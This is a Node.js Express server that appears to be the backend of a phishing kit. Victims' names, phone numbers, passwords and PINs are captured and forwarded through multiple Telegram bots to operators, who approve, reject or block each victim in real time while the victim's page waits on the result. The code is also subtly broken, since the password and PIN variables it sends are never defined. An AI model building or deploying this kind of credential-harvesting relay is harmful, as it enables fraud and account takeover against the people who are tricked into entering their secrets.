require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------------- MEMORY STORES ----------------
const passwordRequests = {};
const pinRequests = {};
const blockedRequests = {};
const requestMeta = {}; // requestId → { name, phone, botId }

// ---------------- MULTI-BOT STORE ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;

  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];

  if (token && chatId) {
    bots.push({ botId: `bot${i}`, token, chatId });
  }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));

// ---------------- BOT ENTRY ROUTE (FIX) ----------------
app.get('/bot/:botId', (req, res) => {
  const botId = req.params.botId;
  const bot = bots.find(b => b.botId === botId);

  if (!bot) {
    return res.status(404).send('Invalid bot');
  }

  // Redirect to frontend with botId
  res.redirect(`/index.html?botId=${botId}`);
});

// ---------------- STATIC FILES ----------------
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length
        ? { inline_keyboard: buttons }
        : undefined
    });
  } catch (e) {
    console.error('❌ Telegram send error:', e.response?.data || e.message);
  }
}

async function answerCallback(bot, id) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/answerCallbackQuery`, {
      callback_query_id: id
    });
  } catch {}
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot) {
  if (!DOMAIN) {
    console.error('❌ BACKEND_DOMAIN not set');
    return;
  }

  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
    );
    console.log(`✅ Webhook set for ${bot.botId}`);
  } catch (e) {
    console.error(`❌ Webhook failed for ${bot.botId}`, e.response?.data || e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

// ---------------- PASSWORD STEP ----------------
app.post('/submit-password', (req, res) => {
  console.log('📥 PASSWORD SUBMIT:', req.body);

  const { name, phone, botId } = req.body;
  const bot = getBot(botId);

  if (!bot) {
    console.error('❌ Invalid bot:', botId);
    return res.status(400).json({ error: 'Invalid bot' });
  }

  const requestId = uuidv4();
  passwordRequests[requestId] = null;
  requestMeta[requestId] = { name, phone, botId };

  sendTelegram(
    bot,
    `🔐 PASSWORD VERIFICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔑 Password: ${password}
🆔 Ref: ${requestId}`,
    [[
      { text: '✅ Correct Password', callback_data: `pass_ok:${requestId}` },
      { text: '❌ Wrong Password', callback_data: `pass_bad:${requestId}` }
    ]]
  );

  res.json({ requestId });
});

app.get('/check-password/:id', (req, res) => {
  res.json({ approved: passwordRequests[req.params.id] ?? null });
});

// ---------------- PIN STEP ----------------
app.post('/submit-pin', (req, res) => {
  console.log('📥 PIN SUBMIT:', req.body);

  const { name, phone, botId } = req.body;
  const bot = getBot(botId);

  if (!bot) {
    console.error('❌ Invalid bot:', botId);
    return res.status(400).json({ error: 'Invalid bot' });
  }

  const requestId = uuidv4();
  pinRequests[requestId] = null;
  requestMeta[requestId] = { name, phone, botId };

  sendTelegram(
    bot,
    `🔐 PIN VERIFICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔢 PIN: ${pin}
🆔 Ref: ${requestId}`,
    [[
      { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
      { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
      { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
    ]]
  );

  res.json({ requestId });
});

app.get('/check-pin/:id', (req, res) => {
  if (blockedRequests[req.params.id]) {
    return res.json({ blocked: true });
  }
  res.json({ approved: pinRequests[req.params.id] ?? null });
});

// ---------------- TELEGRAM CALLBACK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
  console.log('📡 Telegram webhook hit');

  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [action, requestId] = cb.data.split(':');
  const meta = requestMeta[requestId];
  let feedback = '';

  if (action === 'pass_ok') { passwordRequests[requestId] = true; feedback = '✅ Password approved'; }
  if (action === 'pass_bad') { passwordRequests[requestId] = false; feedback = '❌ Password rejected'; }
  if (action === 'pin_ok') { pinRequests[requestId] = true; feedback = '✅ PIN approved'; }
  if (action === 'pin_bad') { pinRequests[requestId] = false; feedback = '❌ PIN rejected'; }
  if (action === 'pin_block') { blockedRequests[requestId] = true; feedback = '🛑 User blocked'; }

  if (feedback && meta) {
    await sendTelegram(
      bot,
      `📝 ACTION TAKEN

👤 Name: ${meta.name}
📞 Phone: ${meta.phone}
${feedback}`
    );
  }

  await answerCallback(bot, cb.id);
  res.sendStatus(200);
});

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
  app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
  });
});
